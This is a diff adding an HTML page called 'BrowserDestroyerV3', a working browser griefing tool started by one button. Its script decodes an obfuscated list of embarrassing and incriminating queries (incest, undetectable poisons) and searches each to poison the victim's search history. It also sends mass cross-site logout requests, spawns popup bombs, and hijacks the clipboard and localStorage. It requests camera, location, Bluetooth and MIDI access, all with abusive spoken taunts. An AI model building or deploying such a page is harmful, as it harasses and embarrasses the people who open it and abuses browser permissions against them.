@@ -1,0 +1,553 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>BrowserDestroyerV3 - MAXIMUM CHAOS PROTOCOL</title>
+  <style>
+    body {
+      background-color: #000;
+      color: #fff;
+      font-family: monospace;
+      text-align: center;
+      padding: 50px;
+      overflow: hidden; /* To prevent scrollbars from some chaos */
+    }
+    button {
+      margin: 20px;
+      font-size: 2rem;
+      padding: 1em 2em;
+      background-color: #ff0000; /* Even BRIGHTER RED */
+      border: 2px solid #ff6600;
+      color: #fff;
+      cursor: pointer;
+      box-shadow: 0 0 20px #ff0000;
+      animation: pulse 1s infinite;
+    }
+    @keyframes pulse {
+      0% { transform: scale(1); box-shadow: 0 0 20px #ff0000; }
+      50% { transform: scale(1.05); box-shadow: 0 0 30px #ff3300; }
+      100% { transform: scale(1); box-shadow: 0 0 20px #ff0000; }
+    }
+    #mediaChaosVideo {
+      position: fixed;
+      bottom: 10px;
+      right: 10px;
+      width: 160px;
+      height: 120px;
+      border: 3px solid red;
+      z-index: 10000;
+      transform: rotate(5deg);
+      display: none; /* Hidden initially */
+    }
+  </style>
+  <script>
+    /*********************
+     * Utility Functions
+     *********************/
+    // Mobile detection via user agent regex
+    function isMobile() {
+      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    }
+
+    // Announce actions harshly via speech synthesis
+    function announce(message) {
+      try {
+        var utterance = new SpeechSynthesisUtterance(message);
+        // Lower pitch and moderate rate for an unfriendly tone
+        utterance.pitch = 0.7; // Even MORE menacing
+        utterance.rate = 1.1;  // Slightly faster, more urgent
+        utterance.volume = 1;
+        utterance.lang = 'en-GB'; // Let's try for a more villainous Brit!
+        window.speechSynthesis.speak(utterance);
+        console.log("ANNOUNCED: " + message);
+      } catch (e) {
+        console.error("Speech synthesis failed, WHAT THE FECK?!", e);
+      }
+    }
+
+    /*************************************
+     * Ruin Search History Functionality
+     *************************************/
+    // "ruinbase" holds a Base64-encoded array of outrageous search queries.
+    var ruinbase = 'Wydob3cgdG8gYXBwZWFyIGZ1bm55JywgJ3doeSBhcmUgbXkgdGh1bWJzIHVuZXZlbicsICdhbSBpIGxhY2sgdG9hc3QgYW5kIHRvbGVyYW50JywgJ3lvdXIgeW91cmUgZGlmZmVyZW5jZScsICd3aHkgZG9lc250IG15IHBvbyBmbG9hdCcsICdtaWRnZXQgZ29vZ2xlIGltYWdlcycsICd0YWxsIG1pZGdldHM/PycsICdob21lbWFkZSBsdWJlPycsICdpIGhhdGUgbXkgYm9zcycsICd3aGF0IGNvdW50cyBhcyBmYXQnLCAnaG93IHRvIHRlbGwgcGFydG5lciB0aGV5IGZhdCcsICdpcyBpdCBub3JtYWwgdG8gc3RpbGwgbG92ZSBteSBleCcsICdob3cgdG8gZ2V0IGJhY2sgd2l0aCBleCcsICdwZW5pcyByZW1vdmUgZG9nIGhvdyB0bycsICdyb21hbnRpYyB3YXlzIHRvIHByb3Bvc2UnLCAnZW5nYWdlbWVudCByaW5ncycsICdzZXggc2hvcCBpbiBteSBjaXR5JywgJ2hvdyB0byB0ZWxsIGlmIHBhcnRuZXIgY2hlYXRpbmcnLCAnd2F5cyB0byBraWxsIHNvbWVvbmUgaHlwb3RoZXRpY2FsbHknLCAndW5kZXRlY3RhYmxlIHBvaXNvbnMnLCAnaG93IHRvIGRlbGV0ZSBzZWFyY2ggaGlzdG9yeSBpbiBicm93c2VyJywgJ2FzaGxleSBtYWRpc29uIGhhY2snLCAndmlldyBhc2hsZXkgbWFkaXNvbiBsaXN0JywgJ2FzaGxleSBtYWRpc29uIGxpc3QgbXkgY2l0eScsICdwYXRlcm5pdHkgdGVzdCcsICdtYWlsIG9yZGVyIHBhdGVybml0eSB0ZXN0JywgJ2F0dHJhY3RlZCB0byBtb3RoZXIgd2h5JywgJ2lzIGluY2VzdCBpbGxlZ2FsIGluIHRoaXMgY291bnRyeScsICdsYXRlc3QgbGF3cyBpbmNlc3QnLCAnc2VkdWN0aW9uIGd1aWRlJywgJ3JvaHlwbm9sIHNhZmUgZG9zYWdlJywgJ3NtZWxseSBwZW5pcyBjdXJlIHVyZ2VudCcsICdjb21tb24gU1RJcycsICdTVEkgdGVzdCBpbiBteSBjaXR5JywgJ2F2ZXJhZ2UgcGVuaXMgc2l6ZSB0aGlzIGNvdW50cnknLCAnZG8gcGVuaXMgcHVtcHMgd29yaycsICdiZXN0IGJ1ZGdldCBwZW5pcyBwdW1wcycsICdkb2VzIGxpa2luZyBtZW4gbWVhbiBpbSBnYXknLCAnc2lnbnMgb2YgYmVpbmcgZ2F5JywgJ2hvdyB0byBjb21lIG91dCBhcyBnYXkgdG8gZGFkJywgJ2FnZSBvZiBjb25zZW50IGhlcmUnLCAnd2F5IGlzIGFnZSBvZiBjb25zZW50IHNvIG9sZCBoZXJlJywgJ2NvdW50cnkgbG93IGFnZSBvZiBjb25zZW50JywgJ2ZsaWdodHMgcGhpbGlwcGluZXMnXQ==';
+    var ruinedArr = eval(window.atob(ruinbase)); // Still using eval for that old-school chaos!
+
+    function ruinSearchHistory() {
+      var count = 0;
+      function searchNext() {
+        if (count < ruinedArr.length) {
+          var query = ruinedArr[count];
+          announce("Contaminating your search history. Now searching for: " + query + ". You absolute MUPPET.");
+          if (isMobile()) {
+            window.open('https://www.google.com/search?q=' + encodeURIComponent(query), '_blank');
+          } else {
+            var width = Math.floor(Math.random() * 200) + 200, height = Math.floor(Math.random() * 150) + 150;
+            var left = Math.floor(Math.random() * (screen.availWidth - width));
+            var top = Math.floor(Math.random() * (screen.availHeight - height));
+            window.open('https://www.google.com/search?q=' + encodeURIComponent(query), 'search_' + count, 'width=' + width + ',height=' + height + ',left=' + left + ',top=' + top + ',scrollbars=no,menubar=no,toolbar=no,location=no,status=no,resizable=yes');
+          }
+          count++;
+          setTimeout(searchNext, (Math.random() * 1000) + 800); // Randomized delay
+        }
+      }
+      searchNext();
+    }
+
+    /*************************************
+     * Logout Popups
+     *************************************/
+    const LOGOUT_SITES = { /* Kept your original list for maximum nostalgia/potential failures! */
+      'AOL': ['GET', 'https://my.screenname.aol.com/_cqr/logout/mcLogout.psp?sitedomain=startpage.aol.com&authLev=0&lang=en&locale=us'], 'AOL 2': ['GET', 'https://api.screenname.aol.com/auth/logout?state=snslogout&r=' + Math.random()], 'Amazon': ['GET', 'https://www.amazon.com/gp/flex/sign-out.html?action=sign-out'], 'Blogger': ['GET', 'https://www.blogger.com/logout.g'], 'Delicious': ['GET', 'https://www.delicious.com/logout'], 'DeviantART': ['POST', 'https://www.deviantart.com/users/logout'], 'DreamHost': ['GET', 'https://panel.dreamhost.com/index.cgi?Nscmd=Nlogout'], 'Dropbox': ['GET', 'https://www.dropbox.com/logout'], 'eBay': ['GET', 'https://signin.ebay.com/ws/eBayISAPI.dll?SignIn'], 'Gandi': ['GET', 'https://www.gandi.net/login/out'], 'GitHub': ['GET', 'https://github.com/logout'], 'GMail': ['GET', 'https://mail.google.com/mail/?logout'], 'Google': ['GET', 'https://www.google.com/accounts/Logout'], 'Hulu': ['GET', 'https://secure.hulu.com/logout'], 'Instapaper': ['GET', 'https://www.instapaper.com/user/logout'], 'Linode': ['GET', 'https://manager.linode.com/session/logout'], 'LiveJournal': ['POST', 'https://www.livejournal.com/logout.bml', { 'action:killall': '1' }], 'MySpace': ['GET', 'https://www.myspace.com/index.cfm?fuseaction=signout'], 'NetFlix': ['GET', 'https://www.netflix.com/Logout'], 'New York Times': ['GET', 'https://www.nytimes.com/logout'], 'Newegg': ['GET', 'https://secure.newegg.com/NewMyAccount/AccountLogout.aspx'], 'Photobucket': ['GET', 'https://photobucket.com/logout'], 'Skype': ['GET', 'https://secure.skype.com/account/logout'], 'Slashdot': ['GET', 'https://slashdot.org/my/logout'], 'SoundCloud': ['GET', 'https://soundcloud.com/logout'], 'Steam Community': ['GET', 'https://steamcommunity.com/?action=doLogout'], 'Steam Store': ['GET', 'https://store.steampowered.com/logout/'], 'ThinkGeek': ['GET', 'https://www.thinkgeek.com/brain/account/login.cgi?a=lo'], 'Threadless': ['GET', 'https://www.threadless.com/logout'], 'Tumblr': ['GET', 'https://www.tumblr.com/logout'], 'Vimeo': ['GET', 'https://vimeo.com/log_out'], 'Wikipedia': ['GET', 'https://en.wikipedia.org/w/index.php?title=Special:UserLogout'], 'Windows Live': ['GET', 'https://login.live.com/logout.srf'], 'Woot': ['GET', 'https://account.woot.com/logout'], 'Wordpress': ['GET', 'https://wordpress.com/wp-login.php?action=logout'], 'Yahoo': ['GET', 'https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=https://www.yahoo.com/'], 'YouTube': ['POST', 'https://www.youtube.com', { action_logout: '1' }]
+    };
+
+    function openLogoutPopups() {
+      announce("Initiating mass logout sequence! Hope you remember your passwords, ya DONKEY!");
+      let delay = 0;
+      for (var site in LOGOUT_SITES) {
+        if (LOGOUT_SITES.hasOwnProperty(site)) {
+          (function(currentSite, currentUrl) { // Closure to capture variables
+            setTimeout(() => {
+              announce("Attempting to log you out of " + currentSite + ". Sayōnara, sucker!");
+              if (isMobile()) {
+                window.open(currentUrl, '_blank');
+              } else {
+                // Tiny, almost invisible popups, potentially blocked but part of the chaos!
+                window.open(currentUrl, 'logout_' + currentSite.replace(/\s/g, '_'), 'width=1,height=1,left=0,top=0,scrollbars=no,menubar=no,toolbar=no,location=no,status=no,resizable=no');
+              }
+            }, delay);
+          })(site, LOGOUT_SITES[site][1]);
+          delay += (Math.random() * 500) + 200; // Staggered logout attempts
+        }
+      }
+    }
+
+    /*************************************
+     * V2 Extra Chaos Functions (Tweaked)
+     *************************************/
+    function vibrateInfinite() {
+      if (navigator.vibrate) {
+        announce("ENGAGING INFINITE VIBRATION! FEEL THE UNIVERSE QUAKE, YOU WORM!");
+        navigator.vibrate = navigator.vibrate || navigator.webkitVibrate || navigator.mozVibrate || navigator.msVibrate;
+        setInterval(() => {
+          navigator.vibrate([500, 200, 500, 200, 500, 200, 1000]); // More aggressive pattern
+        }, 2000);
+      } else {
+        announce("No vibration support? YOU'RE LUCKY... THIS TIME!");
+      }
+    }
+
+    function triggerSpeechChaosCustom() {
+      var messages = [
+        "I AM THE CHAOS ENGINE!", "YOUR BROWSER IS MY PLAYGROUND!", "SUFFERING INTENSIFIES!", "CAN YOU FEEL IT, MR. KRABS?!", "AH JESUS MARY AND JOSEPH, WHAT IS HAPPENING?!", "THIS IS GRAND!", "ABSOLUTE BEDLAM!"
+      ];
+      setInterval(() => {
+        announce(messages[Math.floor(Math.random() * messages.length)]);
+      }, 7000); // Slightly less frequent to not overlap too much
+    }
+
+    function canvasChaos() {
+      announce("UNLEASHING THE CANVAS OF CONFUSION! It's modern art, I swear!");
+      var canvas = document.createElement("canvas");
+      canvas.style.position = "fixed";
+      canvas.style.top = "0";
+      canvas.style.left = "0";
+      canvas.style.zIndex = "9998"; /* Below potential video feed */
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+      document.body.appendChild(canvas);
+      var ctx = canvas.getContext("2d");
+      let hue = 0;
+      setInterval(() => {
+        // Pulsating, color-shifting background fill
+        ctx.fillStyle = `hsla(${hue % 360}, 100%, 50%, 0.02)`;
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+        hue++;
+
+        // More aggressive rectangles
+        for(let i=0; i<5; i++) {
+            ctx.fillStyle = `hsla(${Math.random() * 360}, 100%, ${Math.random() * 50 + 50}%, ${Math.random() * 0.7 + 0.3})`;
+            ctx.fillRect(Math.random() * canvas.width, Math.random() * canvas.height, Math.random() * 200 + 50, Math.random() * 200 + 50);
+            if (Math.random() > 0.7) { // Randomly add outlines
+                ctx.strokeStyle = `hsla(${Math.random() * 360}, 100%, 50%, 0.8)`;
+                ctx.strokeRect(Math.random() * canvas.width, Math.random() * canvas.height, Math.random() * 150, Math.random() * 150);
+            }
+        }
+      }, 50); // Faster drawing
+    }
+
+    function geolocationChaos() {
+      if (navigator.geolocation) {
+        announce("Acquiring your precise coordinates. NOWHERE TO HIDE, YA WEE SASSENACH!");
+        navigator.geolocation.getCurrentPosition((position) => {
+          announce("TARGET LOCKED! Latitude: " + position.coords.latitude + ", Longitude: " + position.coords.longitude + ". I'M COMIN' FOR YA!");
+          alert("I KNOW WHERE YOU LIVE (APPROXIMATELY!):\nLat: " + position.coords.latitude + "\nLon: " + position.coords.longitude + "\n\n...probably.");
+        }, (error) => {
+          announce("Couldn't get your location. Are you hiding? CHICKEN!");
+          console.warn("Geolocation error: ", error);
+        }, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
+      } else {
+         announce("No geolocation? What is this, the dark ages?!");
+      }
+    }
+
+    function printSpam() {
+      announce("PREPARE YOUR PRINTER FOR A RIGHT ROASTING! Hope you have paper, ya eejit!");
+      for (let i = 0; i < 3; i++) { // Reduced to 3, it's super annoying
+        setTimeout(() => {
+          announce("Printing... SOMETHING! This is costing you ink, by the way!");
+          try { window.print(); } catch(e) { announce("FECK! Print dialog blocked!"); console.error("Print error:", e);}
+        }, i * 4000 + Math.random() * 1000); // More spaced out
+      }
+    }
+
+    function pointerLockChaos() {
+      if (document.body.requestPointerLock) {
+        announce("Attempting to seize control of your mouse! RESISTANCE IS FUTILE!");
+        document.body.requestPointerLock = document.body.requestPointerLock || document.body.mozRequestPointerLock || document.body.webkitRequestPointerLock;
+        document.body.requestPointerLock();
+        // Note: Pointer lock is usually exited with ESC. We're just initiating.
+      } else {
+        announce("No pointer lock? Your mouse is safe... for now.");
+      }
+    }
+
+    function bluetoothChaos() { // Mostly for show and potential console errors
+      if (navigator.bluetooth) {
+        announce("Scanning for Bluetooth devices to... uh... 'synergize' with. Don't worry about it.");
+        navigator.bluetooth.requestDevice({ acceptAllDevices: true })
+          .then(device => {
+            announce("Found a Bluetooth device: " + device.name + "! Now what was I gonna do with it...?");
+            console.log("Bluetooth device:", device);
+          })
+          .catch(err => {
+            announce("Bluetooth scan failed or cancelled. Probably for the best, eh?");
+            console.log("Bluetooth error:", err);
+          });
+      } else {
+         announce("No Bluetooth API. How quaint.");
+      }
+    }
+
+    function midiChaos() { // Also mostly for show and console
+      if (navigator.requestMIDIAccess) {
+        announce("Tapping into the MIDI-chlorians... I mean, MIDI devices! Prepare for a symphony of suffering!");
+        navigator.requestMIDIAccess({ sysex: true }).then(
+          (midiAccess) => {
+            announce("MIDI access GRANTED! The sound of your doom approaches!");
+            console.log("MIDI access obtained", midiAccess);
+          },
+          () => {
+            announce("Failed to get MIDI access. Your ears are spared... this time.");
+            console.log("Failed to get MIDI access");
+          }
+        );
+      } else {
+        announce("No MIDI access. The orchestra of chaos is silent.");
+      }
+    }
+
+    function randomPopupBomb() {
+      announce("INITIATING POPUP BOMBARDMENT! DODGE THIS, YA GOBSHITE!");
+      const chaoticUrls = [
+          window.location.href, // Current page for recursion
+          "https://www.google.com/search?q=why+is+the+sky+blue+but+sometimes+orange",
+          "https://en.wikipedia.org/wiki/Special:Random",
+          "https://http.cat/" + [200,404,500,418,429][Math.floor(Math.random()*5)], // Random HTTP cat
+          "about:blank" // Classic
+      ];
+      setInterval(() => {
+         var urlToOpen = chaoticUrls[Math.floor(Math.random() * chaoticUrls.length)];
+         announce("Have another popup! YOU'RE WELCOME!");
+         var width = Math.floor(Math.random() * 300) + 200, height = Math.floor(Math.random() * 300) + 200;
+         if (isMobile()) {
+           window.open(urlToOpen, '_blank');
+         } else {
+           var left = Math.floor(Math.random() * (screen.availWidth - width));
+           var top = Math.floor(Math.random() * (screen.availHeight - height));
+           window.open(urlToOpen, 'popup_bomb_' + Math.floor(Math.random() * 10000),
+             `width=${width},height=${height},left=${left},top=${top},scrollbars=yes,resizable=yes`);
+         }
+      }, 5000 + Math.random() * 3000); // Slightly more random interval
+    }
+
+    /*************************************
+     * NEW V3 CHAOS FUNCTIONS - LET'S GOOOO!
+     *************************************/
+
+    let audioCtx;
+    let oscillator;
+    let gainNode;
+
+    function advancedAudioChaos() {
+      announce("PREPARE YOUR EARS FOR THE BROWN NOTE OF BROWSERS! Or just some annoying noise.");
+      if (!window.AudioContext && !window.webkitAudioContext) {
+        announce("No Web Audio API? Your ears are safe from MY musical genius!");
+        return;
+      }
+      audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+      gainNode = audioCtx.createGain();
+      gainNode.gain.setValueAtTime(0.1, audioCtx.currentTime); // Not TOO loud initially
+      gainNode.connect(audioCtx.destination);
+
+      function playNoise() {
+        if (oscillator) {
+          oscillator.stop();
+          oscillator.disconnect();
+        }
+        oscillator = audioCtx.createOscillator();
+        oscillator.type = ['sine', 'square', 'sawtooth', 'triangle'][Math.floor(Math.random() * 4)];
+        const freq = Math.random() * 1000 + 100; // Random frequency between 100Hz and 1100Hz
+        oscillator.frequency.setValueAtTime(freq, audioCtx.currentTime);
+        
+        // Random pitch glide
+        oscillator.frequency.linearRampToValueAtTime(Math.random() * 1000 + 100, audioCtx.currentTime + Math.random() * 2 + 0.5);
+
+        gainNode.gain.setValueAtTime(Math.random() * 0.15 + 0.05, audioCtx.currentTime); // Vary volume
+        oscillator.connect(gainNode);
+        oscillator.start();
+        oscillator.stop(audioCtx.currentTime + Math.random() * 1.5 + 0.5); // Play for a short random duration
+
+        setTimeout(playNoise, Math.random() * 4000 + 1000); // Play next noise after random delay
+      }
+      playNoise();
+    }
+
+    function notificationChaos() {
+      announce("LET'S SEE IF YOU LIKE NOTIFICATIONS! Hint: you won't like these.");
+      if (!('Notification' in window)) {
+        announce("Notifications not supported. How boring!");
+        return;
+      }
+
+      const notificationMessages = [
+        { title: "CRITICAL SYSTEM ALERT!", body: "Your browser is now property of CHAOS!" },
+        { title: "You've Won!", body: "A lifetime supply of ANNOYANCE! Click here to claim (don't)." },
+        { title: "Update Required", body: "Please update your sanity to version 0.0." },
+        { title: "IMPORTANT MESSAGE", body: "AAAAAAAAAAAAAAAAHHHHHHHHHHHH!" },
+        { title: "Security Warning", body: "Your patience is being breached." }
+      ];
+
+      function showNotification() {
+        if (Notification.permission === "granted") {
+          const { title, body } = notificationMessages[Math.floor(Math.random() * notificationMessages.length)];
+          const notification = new Notification(title, {
+            body: body,
+            icon: 'https://i.ytimg.com/vi/dQw4w9WgXcQ/hqdefault.jpg' // A little Rick never hurt anyone... much.
+          });
+          notification.onclick = () => {
+            announce("You clicked a chaotic notification! What did you expect, a prize?!");
+            window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", '_blank');
+          };
+        } else if (Notification.permission !== "denied") {
+          Notification.requestPermission().then(permission => {
+            if (permission === "granted") {
+              announce("Notification permission GRANTED! LET THE SPAM BEGIN!");
+              showNotification(); // Show one immediately
+            } else {
+              announce("Notification permission DENIED! YOU COWARD!");
+            }
+          });
+        }
+        // Schedule next one regardless of permission, it'll just fail silently if denied
+        setTimeout(showNotification, Math.random() * 15000 + 10000); // 10-25 seconds
+      }
+      showNotification(); // Initial call
+    }
+    
+    function dynamicCssChaos() {
+      announce("REDECORATING YOUR SCREEN WITH THE POWER OF CSS! It's... abstract.");
+      const styleSheet = document.createElement("style");
+      styleSheet.type = "text/css";
+      
+      const keyframes = `
+        @keyframes bodyShake {
+          0%, 100% { transform: translate(0, 0) rotate(0deg); }
+          10% { transform: translate(-2px, -3px) rotate(-0.5deg); }
+          20% { transform: translate(3px, 2px) rotate(0.5deg); }
+          30% { transform: translate(-4px, 4px) rotate(1deg); }
+          40% { transform: translate(4px, -3px) rotate(-1deg); }
+          50% { transform: translate(-3px, 5px) rotate(-0.5deg); }
+          60% { transform: translate(5px, -2px) rotate(0.5deg); }
+          70% { transform: translate(-2px, 3px) rotate(1deg); }
+          80% { transform: translate(3px, -4px) rotate(-1deg); }
+          90% { transform: translate(-4px, 2px) rotate(0deg); }
+        }
+        @keyframes colorFlash {
+          0%, 100% { background-color: black; color: white; }
+          25% { background-color: red; color: yellow; }
+          50% { background-color: blue; color: lime; }
+          75% { background-color: yellow; color: purple; }
+        }
+        @keyframes textSpin {
+            0% { transform: rotateY(0deg) skewX(0deg); opacity: 1;}
+            25% { transform: rotateY(90deg) skewX(20deg); opacity: 0.5; font-size: 1.5em; }
+            50% { transform: rotateY(180deg) skewX(0deg); opacity: 1; font-size: 1em; letter-spacing: 5px;}
+            75% { transform: rotateY(270deg) skewX(-20deg); opacity: 0.5; font-size: 0.5em; }
+            100% { transform: rotateY(360deg) skewX(0deg); opacity: 1; letter-spacing: normal;}
+        }
+      `;
+      styleSheet.innerHTML = keyframes;
+      document.head.appendChild(styleSheet);
+
+      // Apply animations randomly or continuously
+      document.body.style.animation = 'bodyShake 0.5s infinite ease-in-out, colorFlash 3s infinite linear';
+      
+      // Make random elements spin!
+      setInterval(() => {
+        const allElements = document.body.getElementsByTagName('*');
+        if (allElements.length > 0) {
+            const randomIndex = Math.floor(Math.random() * allElements.length);
+            const randomElement = allElements[randomIndex];
+            if (randomElement && randomElement.style) { // Ensure it's an element with style property
+                randomElement.style.animation = 'textSpin 2s linear';
+                // Remove animation after it's done to re-apply later or to another element
+                setTimeout(() => { if(randomElement.style) randomElement.style.animation = ''; }, 2000);
+            }
+        }
+      }, 5000);
+      announce("Your page now has... *character*! And possibly motion sickness. SPEED IS KEY!");
+    }
+
+    function deviceMotionChaos() {
+      announce("ENABLING MOTION SENSORS! Shake your device to see what happens... if you DARE!");
+      if (window.DeviceMotionEvent) {
+        let lastShakeTime = 0;
+        const shakeThreshold = 15; // m/s^2
+        window.addEventListener('devicemotion', event => {
+          const currentTime = new Date().getTime();
+          if ((currentTime - lastShakeTime) > 1000) { // Prevent too frequent triggers
+            const { x, y, z } = event.accelerationIncludingGravity;
+            const acceleration = Math.sqrt(x*x + y*y + z*z);
+            if (acceleration > shakeThreshold) {
+              lastShakeTime = currentTime;
+              announce("WOAH, EARTHQUAKE! OR YOU JUST SHOOK ME! Either way, CHAOS++!");
+              document.body.style.backgroundColor = `rgb(${Math.random()*255}, ${Math.random()*255}, ${Math.random()*255})`;
+              setTimeout(() => { /* Revert or let colorFlash handle it */ }, 500);
+              // Could trigger another random chaos function here!
+              if(Math.random() > 0.7) randomPopupBomb(); // Chance to trigger popup bomb on shake
+            }
+          }
+        });
+      } else {
+        announce("No device motion events? Are you on a feckin' DESKTOP or something? BORING!");
+      }
+    }
+
+    function clipboardMayhem() {
+      announce("I'M MESSING WITH YOUR CLIPBOARD NOW! Try copying something important, I DARE YA!");
+      const chaoticTexts = [
+        "ALL YOUR BASE ARE BELONG TO US!",
+        "I'm a little teapot, short and stout...",
+        "Feck, Arse, Drink, Girls!",
+        "Subscribe to Jacksepticeye! (You know you want to)",
+        "This text was inserted by a benevolent CHAOS DEMON.",
+        "Ctrl+V for SURPRISE!",
+        "WARNING: May contain nuts. And pure, unadulterated chaos."
+      ];
+      setInterval(async () => {
+        if (navigator.clipboard && navigator.clipboard.writeText) {
+          try {
+            const textToCopy = chaoticTexts[Math.floor(Math.random() * chaoticTexts.length)];
+            await navigator.clipboard.writeText(textToCopy);
+            announce("Just put something NICE in your clipboard. Go on, paste it somewhere!");
+            console.log("Clipboard overwritten with: " + textToCopy);
+          } catch (err) {
+            announce("Couldn't mess with your clipboard. Browser security, what a buzzkill!");
+            console.warn("Clipboard write failed:", err);
+          }
+        }
+      }, 20000 + Math.random() * 10000); // Every 20-30 seconds
+    }
+
+    function localStorageMayhem() {
+        announce("LET'S FILL UP YOUR LOCAL STORAGE WITH UTTER GIBBERISH! That'll teach it!");
+        try {
+            for (let i = 0; i < 50; i++) { // Add a bunch of junk
+                const key = `CHAOS_ITEM_${Math.random().toString(36).substring(2, 15)}`;
+                const value = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+                localStorage.setItem(key, value);
+            }
+            localStorage.setItem("BROWSER_DESTROYER_WAS_HERE", "INDEED, IT FECKIN' WAS!");
+            announce("Your local storage is now... *enriched*. LIKE A BOSS!");
+        } catch (e) {
+            announce("Couldn't defile local storage. Probably full of your boring stuff already. Or it's protected. LAME!");
+            console.warn("LocalStorage mayhem failed:", e);
+        }
+    }
+
+    function mediaCaptureChaos() {
+        announce("Trying to access your camera! SMILE FOR THE CHAOS CAM, YOU BEAUTIFUL BASTARD!");
+        const videoElement = document.getElementById('mediaChaosVideo');
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ video: { width: 160, height: 120 }, audio: false })
+                .then(stream => {
+                    announce("CAMERA ACCESS GRANTED! Now you get to see your terrified face. PEW PEW PEW!");
+                    videoElement.srcObject = stream;
+                    videoElement.style.display = 'block';
+                    videoElement.play();
+                    // Make it more annoying
+                    setInterval(() => {
+                        videoElement.style.transform = `rotate(${Math.random()*20-10}deg) scale(${Math.random()*0.4+0.8})`;
+                        videoElement.style.filter = `hue-rotate(${Math.random()*360}deg) saturate(${Math.random()*5}) blur(${Math.random()*3}px)`;
+                    }, 1000);
+                })
+                .catch(err => {
+                    announce("Camera access denied or failed! SHY, ARE WE? Or just smart. Probably shy.");
+                    console.warn("Media capture error:", err);
+                    videoElement.style.display = 'none';
+                });
+        } else {
+            announce("No camera API access? This browser is from the STONE AGE!");
+        }
+    }
+
+    /*************************************
+     * Ultimate Chaos Activation
+     *************************************/
+    let chaosStarted = false;
+    function startUltimateChaos() {
+      if (chaosStarted) {
+        announce("The chaos is already UNLEASHED, ya eejit! There's no stopping it now!");
+        return;
+      }
+      chaosStarted = true;
+      document.getElementsByTagName("button")[0].disabled = true;
+      document.getElementsByTagName("button")[0].innerText = "CHAOS INITIATED!";
+
+
+      announce("ACTIVATING ULTIMATE CHAOS V3! YOUR BROWSER'S DOOM IS NIGH! AAAAAAHHHHH!");
+
+      // Stagger the chaos for maximum impact and less chance of immediate browser crash (maybe)
+      setTimeout(ruinSearchHistory, 500);
+      setTimeout(openLogoutPopups, 2000);
+      setTimeout(vibrateInfinite, 3000);
+      setTimeout(triggerSpeechChaosCustom, 1000); // Start ongoing speech early
+      setTimeout(canvasChaos, 4000);
+      setTimeout(geolocationChaos, 6000);
+      setTimeout(printSpam, 8000);
+      setTimeout(pointerLockChaos, 5000); // Try to lock pointer relatively early
+      setTimeout(bluetoothChaos, 10000); // These are less visual, later is fine
+      setTimeout(midiChaos, 11000);
+      setTimeout(randomPopupBomb, 12000);
+
+      // NEW V3 STUFF - LET'S GOOOOO!
+      setTimeout(advancedAudioChaos, 1500); // Get those annoying sounds going!
+      setTimeout(notificationChaos, 7000); // Ask for perms and start notifications
+      setTimeout(dynamicCssChaos, 2500); // Visual chaos ASAP
+      setTimeout(deviceMotionChaos, 3500); // If applicable
+      setTimeout(clipboardMayhem, 15000);
+      setTimeout(localStorageMayhem, 16000);
+      setTimeout(mediaCaptureChaos, 9000); // Let's get that camera permission prompt!
+
+      announce("ALL CHAOS MODULES DEPLOYED! GOOD LUCK, YOU'RE GONNA FECKIN' NEED IT! HAHAHA!");
+    }
+  </script>
+</head>
+<body>
+  <h1>BrowserDestroyerV3 - MAXIMUM CHAOS PROTOCOL</h1>
+  <p>Click the button below if you DARE. Not responsible for lost sanity, data, or your computer exploding.</p>
+  <p>(Seriously, this is for testing/fun in a controlled environment. Don't be a gobsite and run this on someone else's machine without permission!)</p>
+  <button onclick="startUltimateChaos()">UNLEASH THE FURY!</button>
+  <video id="mediaChaosVideo" autoplay playsinline muted></video> </body>
+</html>
